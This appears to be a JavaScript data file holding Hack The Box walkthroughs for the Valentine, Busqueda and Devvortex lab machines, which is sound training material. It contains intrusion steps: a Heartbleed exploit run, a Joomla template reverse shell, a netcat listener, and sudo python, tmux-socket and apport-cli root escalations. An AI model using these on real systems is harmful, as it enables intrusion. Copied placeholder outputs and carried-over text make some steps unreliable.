        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Editor/netcat.png','/screenshots/Editor/netcat2.png']
      },
      {
        title: 'User Access',
        content: 'we got the password, but we still got to know the user. we cd to the home directory and ls and got that their is oliver named user exists. We ssh oliver@HTB-Machine-IP and put the password and got logged in and got the user flag in home directory.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Editor/ssh.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'We privileged escalated using netdata after surfing the internet and ot the exploit to become root and got the root flag.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Editor/root.png']
      }
    ]
  },
  {
    id: '11',
    name: 'Valentine',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '17th February, 2018',
    avatarUrl: '/valentine.png',
    tags: ['Web','CVE'],
    ipAddress: '10.10.11.14',
    description: 'Valentine is a very unique medium difficulty machine which focuses on the Heartbleed vulnerability, which had devastating impact on systems across the globe.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the normal nmap scan and found 3 ports open, ssh 22, http 80, https 443.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Valentine/nmap.png']
      },
      {
        title: 'Directory Bruteforce',
        content: 'After that we directory brute forced url given and found 4 directories.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Valentine/brute.png']
      },
      {
        title: 'Enumerating Directories',
        content: 'Enumerating those directories we found /dev directory interesting.From that we got hype_key which contained hex-encoded private ssh-key.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Valentine/hype-dir.png','/screenshots/Valentine/hex-dir.png']
      },
      {
        title: 'Nmap Vuln Scan',
        content: 'We ran the nmap script nmap -p 443 --script heartbleed Machine-IP and we confirmed that the machine is vulnerable to heartbleed vulnerability with CVE-2014-0160.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Valentine/vuln-scan.png']
      },
      {
        title: 'Nmap Vuln Scan',
        content: 'We ran the nmap script nmap -p 443 --script heartbleed Machine-IP and we confirmed that the machine is vulnerable to heartbleed vulnerability with CVE-2014-0160.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Valentine/vuln-scan.png']
      },
    ],
    foothold: [
      {
        title: 'Gaining Access',
        content: 'After surfing on google we found exploit on Github https://github.com/sensepost/heartbleed-poc/blob/master/heartbleed-poc.py we saved the exploit on our directory and  exploited using python2 heartbleed-exploit.py Machine-IP. We got the password in Base64 Format and decoded it to heartbeatbelievetheyhype.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Editor/netcat.png','/screenshots/Editor/netcat2.png']
      },
      {
        title: 'User Access',
        content: 'we got the password, but we still got to know the user. we cd to the home directory and ls and got that their is oliver named user exists. We ssh oliver@HTB-Machine-IP and put the password and got logged in and got the user flag in home directory. Now we ran ssh -i id_rsa hype@10.129.232.136 and typed the above password got logged in as hype user. and we used cat command to cat user.txt to get user flag. Or we ran this and then put the password.',
        code: 'ssh -i id_rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  -o HostkeyAlgorithms=+ssh-rsa \
  hype@10.129.232.136',
        imageUrls: ['/screenshots/Valentine/pass.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'Sudo -l was restriced so we used ps aux (process status) to check what is being run as root. Now if we run this command we can directly get into root user command, and we got the root flag using cat /root/root.txt',
        code: 'hype@Valentine:~$ ps aux | grep tmux root       1046  0.0  0.1  26416  1668 ?        Ss   Dec14   0:26 /usr/bin/tmux -S /.devs/dev_sess hype       7606  0.0  0.0  13576   924 pts/0    S+   00:45   0:00 grep --color=auto tmux tmux -S /.devs/dev_sess attach',
        //imageUrls: ['/screenshots/Editor/root.png']
      }
    ]
  },
  {
    id: '12',
    name: 'Busqueda',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '8th April, 2023',
    avatarUrl: '/busqueda.png',
    tags: ['Web','git'],
    ipAddress: '10.12.111.222',
    description: 'Busqueda is an Easy Difficulty Linux machine that involves exploiting a command injection vulnerability present in a Python module. By leveraging this vulnerability, we gain user-level access to the machine. To escalate privileges to root, we discover credentials within a Git config file, allowing us to log into a local Gitea service. Additionally, we uncover that a system checkup script can be executed with root privileges by a specific user. By utilizing this script, we enumerate Docker containers that reveal credentials for the administrator user&amp;#039;s Gitea account. Further analysis of the system checkup script&amp;#039;s source code in a Git repository reveals a means to exploit a relative path reference, granting us Remote Code Execution (RCE) with root privileges.',
    enumeration: [
      {
        title: 'Nmap Scan and Directory Bruteforce',
        content: 'First we ran nmap and got ssh and http open. In parallel we ran the directory Bruteforce but did not find anything. On the website we saw that website is powered by Flask and Searchor, we checked the both the version`s exploit and we found exploit in Searchor 2.4.0.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Busqueda/nmap.png','/screenshots/Busqueda/searchor.png']
      }
    ],
    foothold: [
      {
        title: 'Gaining Access & User flag',
        content: 'We downloaded the exploit and and ran it, on the default port of 9001. and got connected. We got the user.txt flag there',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Busqueda/expliot.png','/screenshots/Busqueda/user.png']
      },
      {
        title: 'Trying to gain Root Access',
        content: 'Even trying installing the terminal using python3 -c `import pty;pty.spawn("/bin/bash")` nor script /dev/null -c bash worked.Also /var/www/app/app.py did not give us anything meaningful.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Busqueda/root1.png','/screenshots/Busqueda/root2.png']
      },
      {
        title: '.git',
        content: 'After enumerating more, we found .git using ls -la. We found password /var/www/app/.git/config, and got password.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Busqueda/git.png','/screenshots/Busqueda/pass.png']
      },
      {
        title: 'SSH',
        content: 'We got logged in using secure shell (ssh), using this password.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Busqueda/user.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'After reading the writeup and using GPT, we got loggedin as root. After the scripts in the screenshots we were disconnected from the netcat, after reconnecting we got loggedin as root',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Busqueda/root3.png','/screenshots/Busqueda/flag-final.png']
      }
    ]
  },
  {
    id: '13',
    name: 'Devvortex',
    os: OS.LINUX,
    difficulty: Difficulty.EASY,
    points: 20,
    releaseDate: '25th November, 2023',
    avatarUrl: '/devvortex.png',
    tags: ['Web','CMS','Joomla'],
    ipAddress: '10.120.11.24',
    description: 'Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service&amp;#039;s configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell.',
    enumeration: [
      {
        title: 'Nmap Scan',
        content: 'First we ran the nmap scan and got 2 ports open, http and ssh.We resolved the ip to in the host file and visited thewebsite nut didnt find anything meaningful',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/nmap.png','/screenshots/Devvortex/hosts.png','/screenshots/Devvortex/website.png']
      },
      {
        title: 'Directory & Sub-domain Bruteforcing',
        content: 'We then directory bruteforced using gobuster still didnt find any interesting directory.We then again added the dev.devvortex.htb in the /etc/hosts file.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/brute.png','/screenshots/Devvortex/brute2.png']
      },
      {
        title: 'Adding sub-domain',
        content: 'We then again added the dev.devvortex.htb in the /etc/hosts file.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/hosts2.png']
      },
      {
        title: 'Directory Bruteforcing Sub-domain',
        content: 'We then again directory bruteforced the subdomain and found multiple directories. We checked the robots.txt and found that website is built using joomla CMS',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/brute3.png','/screenshots/Devvortex/brute4.png','/screenshots/Devvortex/robots.png']
      },
      {
        title: 'Joomla Version Reveal',
        content: 'While gathering more information regarding the target, and sufing the web wegot to know that Joomla reveal its version on administrator/manifests/files/joomla.xml and the version was 4.2.6. Upon searching the web we found that it has CVE-2023-23752 which is information disclosure.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/joomla.png']
      },
    ],
    foothold: [
      {
        title: 'CVE-2023-23752',
        content: 'While gathering more information regarding the target, and sufing the web wegot to know that Joomla reveal its version on administrator/manifests/files/joomla.xml and the version was 4.2.6. Upon searching the web we found that it has CVE-2023-23752 which is information disclosure.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/joomla.png']
      },
      {
        title: 'Getting Username and Password',
        content: 'Downloading the exploit from the github and installing the required libraries we ran our exploit got the username and password.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/exploit.png','/screenshots/Devvortex/exploit2.png']
      },
      {
        title: 'Gaining Access',
        content: 'Using the found credentials we logged into the CMS. In the System-> Site Templates -> Cassiopeia -> error.php we injected or payload at the bottom to open a reverse shell on our host.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/cms1.png','/screenshots/Devvortex/cms2.png']
      },
      {
        title: 'Netcat Listener',
        content: 'Then we created the reverse shell on our machine which we will host using python -m http.server and we will use nc -lnvp 4444 to listen and when the site will load the script our shell will be downlaoded and spawnedAfter spawning the shell we imported terminal using python3 -c `import pty;pty.spawn("/bin/bash")` and the tried to read user.txt in /home/logan but permisiion denied.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/netcat.png','/screenshots/Devvortex/netcat2.png']
      },
      {
        title: 'Connecting to Mysql',
        content: 'We then connected to the mysql -u lewis -p',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/database1.png','/screenshots/Devvortex/database2.png','/screenshots/Devvortex/database3.png']
      },
      {
        title: 'Dumping the Mysql',
        content: 'We dumped the the sd4fg_users table.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/database4.png']
      },
      {
        title: 'Cracking Hash',
        content: 'Using the john we cracked the hashed and got the password.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/hash.png']
      },
      {
        title: 'User Flag',
        content: 'Loggin in with ssh we got the user.txt flag.',
        //code: 'nmap -sC -sV -oN nmap.txt 10.10.11.11\n\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu\n80/tcp open  http    Apache httpd 2.4.41',
        imageUrls: ['/screenshots/Devvortex/user.png']
      }
    ],
    privEsc: [
      {
        title: 'Root Escalation',
        content: 'After surfing the web we got to know it is vulnerable to (ALL : ALL) /usr/bin/apport-cli.',
        //code: 'sudo -l\nsudo /usr/bin/python3 -c \'import os; os.setuid(0); os.system("/bin/bash")\'',
        imageUrls: ['/screenshots/Devvortex/root.png']
      }
    ]
  }
];
